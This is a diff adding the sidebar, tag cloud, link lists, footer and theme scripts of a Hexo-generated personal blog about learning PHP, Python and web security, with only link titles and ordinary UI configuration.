+                    <a href="/2023/12/28/T2/">T2</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/12/php%E5%AD%A6%E4%B9%A0/">php学习</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/13/php%E5%AD%A6%E4%B9%A01/">php学习1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/16/php%E5%AE%9E%E6%93%8D/">php实操</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/06/python%E5%AD%A6%E4%B9%A0/">python学习</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/11/python%E5%AD%A6%E4%B9%A02/">python学习2</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/19/sql%E6%B3%A8%E5%85%A51/">sql注入1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/10/%E5%AE%89%E5%8D%93%E7%97%85%E6%AF%92%E7%9B%91%E5%90%AC/">安卓病毒监听</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+
+                
+                <li>
+                    <a href="/2023/12/27/T1/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2023/12/27/T1/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                
+                
+                <li>
+                    <a href="/2023/12/27/T1/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+                
+            </ul>
+            <div class="tab-content">
+                
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+    <a href="/tags/Linux/" style="font-size: 19.782767892761367px;" class="tag-cloud-link">Linux</a>
+    
+    <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 10.673559647133256px;" class="tag-cloud-link">基础知识</a>
+    
+    <a href="/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/" style="font-size: 19.576407249834872px;" class="tag-cloud-link">DNS域名解析</a>
+    
+    <a href="/tags/HTML/" style="font-size: 11.813182286833168px;" class="tag-cloud-link">HTML</a>
+    
+    <a href="/tags/CSS/" style="font-size: 17.272518708361275px;" class="tag-cloud-link">CSS</a>
+    
+    <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 8.878891264357534px;" class="tag-cloud-link">学习</a>
+    
+    <a href="/tags/PHP/" style="font-size: 11.436545779458747px;" class="tag-cloud-link">PHP</a>
+    
+    <a href="/tags/Navicat/" style="font-size: 8.956747976279697px;" class="tag-cloud-link">Navicat</a>
+    
+    <a href="/tags/%E5%AE%89%E8%A3%85/" style="font-size: 13.286903161220383px;" class="tag-cloud-link">安装</a>
+    
+    <a href="/tags/php/" style="font-size: 14.057283253942494px;" class="tag-cloud-link">php</a>
+    
+    <a href="/tags/php%E5%87%BD%E6%95%B0/" style="font-size: 10.704554723183449px;" class="tag-cloud-link">php函数</a>
+    
+    <a href="/tags/%E7%AE%80%E5%8D%95%E7%BD%91%E7%AB%99%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/" style="font-size: 19.259078432239775px;" class="tag-cloud-link">简单网站功能实现</a>
+    
+    <a href="/tags/html/" style="font-size: 17.99503962355923px;" class="tag-cloud-link">html</a>
+    
+    <a href="/tags/postman/" style="font-size: 13.741529998190853px;" class="tag-cloud-link">postman</a>
+    
+    <a href="/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" style="font-size: 11.391460756536128px;" class="tag-cloud-link">文件操作</a>
+    
+    <a href="/tags/python/" style="font-size: 13.925156065790325px;" class="tag-cloud-link">python</a>
+    
+    <a href="/tags/%E5%8F%98%E9%87%8F/" style="font-size: 17.99635966587382px;" class="tag-cloud-link">变量</a>
+    
+    <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 11.955478664115475px;" class="tag-cloud-link">字符串</a>
+    
+    <a href="/tags/%E5%88%97%E8%A1%A8/" style="font-size: 19.603338427841976px;" class="tag-cloud-link">列表</a>
+    
+    <a href="/tags/%E5%85%83%E7%BB%84/" style="font-size: 10.272186627092875px;" class="tag-cloud-link">元组</a>
+    
+    <a href="/tags/if%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD/" style="font-size: 13.92233570843683px;" class="tag-cloud-link">if条件判断</a>
+    
+    <a href="/tags/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/" style="font-size: 16.864271569278404px;" class="tag-cloud-link">循环语句</a>
+    
+    <a href="/tags/sql-%E6%B3%A8%E5%85%A5/" style="font-size: 19.47794230041888px;" class="tag-cloud-link">sql 注入</a>
+    
+    <a href="/tags/%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4/" style="font-size: 8.561488998506134px;" class="tag-cloud-link">操作步骤</a>
+    
+    <a href="/tags/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/" style="font-size: 18.660340467296173px;" class="tag-cloud-link">联合查询</a>
+    
+    <a href="/tags/sql%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0/" style="font-size: 15.16994014602382px;" class="tag-cloud-link">sql报错函数</a>
+    
+    <a href="/tags/bool%E5%92%8C%E7%9D%A1%E7%9C%A0%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" style="font-size: 15.128918011926112px;" class="tag-cloud-link">bool和睡眠盲注脚本</a>
+    
+    <a href="/tags/vue/" style="font-size: 16.373949093385427px;" class="tag-cloud-link">vue</a>
+    
+    <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" style="font-size: 15.19678406729321px;" class="tag-cloud-link">博客搭建</a>
+    
+    <a href="/tags/%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/" style="font-size: 12.983935245271754px;" class="tag-cloud-link">主题配置</a>
+    
+    <a href="/tags/ip%E5%92%8C%E8%B7%AF%E7%94%B1/" style="font-size: 16.625100559658435px;" class="tag-cloud-link">ip和路由</a>
+    
+    <a href="/tags/proxifier/" style="font-size: 8.083464374311292px;" class="tag-cloud-link">proxifier</a>
+    
+    <a href="/tags/wireshark%E6%8A%93%E5%8C%85/" style="font-size: 9.461919287023584px;" class="tag-cloud-link">wireshark抓包</a>
+    
+</div>
+                
+                
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="http://kdays.net/days/" target="_blank">KDays Forum</a>
+    </li>
+    
+    <li>
+        <a href="http://www.gal123.com/" target="_blank">绅士导航♂</a>
+    </li>
+    
+    <li>
+        <a href="http://www.moe123.com/" target="_blank">萌导航</a>
+    </li>
+    
+</div>
+                
+                
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://github.com/tanlinhuitlh/" target="_blank">Github</a>
+    </li>
+    
+    <li>
+        <a href="https://coding.net/u/SORA1" target="_blank">Coding</a>
+    </li>
+    
+    <li>
+        <a href="https://www.zhihu.com/people/aonosora/activities" target="_blank">知乎</a>
+    </li>
+    
+</div>
+                
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 明 尘 Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+
+<script src="/js/activate-power-mode.js"></script>
+
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '8'
+    }
+</script>
+
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
+
+</html>
